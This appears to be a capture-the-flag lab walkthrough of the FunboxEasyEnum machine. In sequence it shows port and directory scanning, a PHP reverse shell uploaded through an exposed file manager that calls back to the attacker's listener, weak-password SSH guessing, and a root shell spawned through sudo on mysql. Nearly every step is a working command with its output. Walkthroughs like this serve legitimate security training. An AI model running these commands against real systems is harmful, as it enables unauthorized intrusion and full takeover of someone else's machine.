Exploitation Guide for FunboxEasyEnum Summary

In this walkthrough, we’ll exploit a file upload vulnerability in a web application to gain a foothold on the target. This leads to remote code execution. We’ll then use simple, manual password guessing to escalate our privileges and abuse the user’s sudo permissions on the mysql binary to spawn a root shell. Enumeration Nmap

We’ll begin with a simple nmap scan.

sudo nmap 192.168.120.148
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 10:27 EST Nmap scan report for 192.168.120.148 Host is up (0.036s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http

If we browse the web server on port 80, we find a default Apache web page. GoBuster

Next, we’ll try brute-forcing the web server’s hidden files and directories with the /usr/share/dirb/wordlists/common.txt wordlist, searching for PHP, text, and HTML files.

(kali㉿kali)-[~] $ gobuster dir -u http://192.168.120.148 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html

=============================================================== Gobuster v3.0.1 ... /index.html (Status: 200) /javascript (Status: 301) /mini.php (Status: 200) /phpmyadmin (Status: 301) /robots.txt (Status: 200) ...

The output includes mini.php which contains a custom Zerion Mini Shell 1.0 application.

Exploitation File Upload Vulnerability

This page may allow uploads to the web root (/var/www/html/). Since the PHP file format seems to be supported, let’s try uploading a PHP reverse shell. We’ll update the IP address and port number as needed.

cp /usr/share/webshells/php/php-reverse-shell.php .

sed -i "s/$ip = '127.0.0.1';/$ip = '192.168.118.5';/g" php-reverse-shell.php

sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php

Next, we’ll click Browse, select our reverse shell file, and click upload. Once uploaded, the file appears in the web root directory listing. Let’s start a Netcat listener on port 4444 and trigger our shell by navigating to http://192.168.120.148/php-reverse-shell.php.

curl http://192.168.120.148/php-reverse-shell.php
WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to 192.168.118.5:4444 ...

Our Netcat listener presents us with a shell as the www-data user.

nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.118.5] from (UNKNOWN) [192.168.120.148] 34362 Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 15:54:03 up 25 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)

Escalation User Enumeration

As part of our enumeration efforts, let’s check the user accounts on the target:

$ cat /etc/passwd root
0:0:root:/root:/bin/bash ... karla
1000:1000:karla:/home/karla:/bin/bash ... harry
1001:1001:,,,:/home/harry:/bin/bash sally
1002:1002:,,,:/home/sally:/bin/bash goat
1003:1003:,,,:/home/goat:/bin/bash oracle:$1$|O@GOeN$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash lissy
1005:1005::/home/lissy:/bin/sh

Although the file contains the password hash for the user oracle, cracking that password finds hiphop , but not further for privesc.

The passwd file contains several users, and every user, except for lissy, has a home directory:

$ ls -l /home total 20 drwxr-xr-x 2 goat goat 4096 Feb 16 13:25 goat drwxr-xr-x 2 harry harry 4096 Jan 28 12:03 harry drwxr-xr-x 2 karla karla 4096 Feb 16 13:23 karla drwxr-xr-x 2 oracle oracle 4096 Feb 16 13:23 oracle drwxr-xr-x 2 sally sally 4096 Jan 28 12:03 sally

SSH

We could use a tool like hydra to mount an online SSH brute-force attack (which will take several minutes), but let’s take a step back and try some less-complicated password attempts. We’ll begin by attempting the username as the password for each user. Here are the username and password pairs we’ll attempt:

goat:goat harry:harry karla:karla oracle:oracle sally:sally

One of the credential pairs (goat:goat) works!

ssh goat@192.168.120.148 goat@192.168.120.148's password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64) ... goat@funbox7:~$ id uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)

Sudo Abuse

Now, let’s attempt to escalate our privileges. We’ll begin with a quick sudo scan:

goat@funbox7:~$ sudo -l Matching Defaults entries for goat on funbox7: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User goat may run the following commands on funbox7: (root) NOPASSWD: /usr/bin/mysql

The scan reveals that we can run /usr/bin/mysql as root through sudo. A GTFOBins article presents a simple command that may give us a root shell.

goat@funbox7:$ whoami goat goat@funbox7:$ sudo /usr/bin/mysql -e '! /bin/sh'

whoami
root
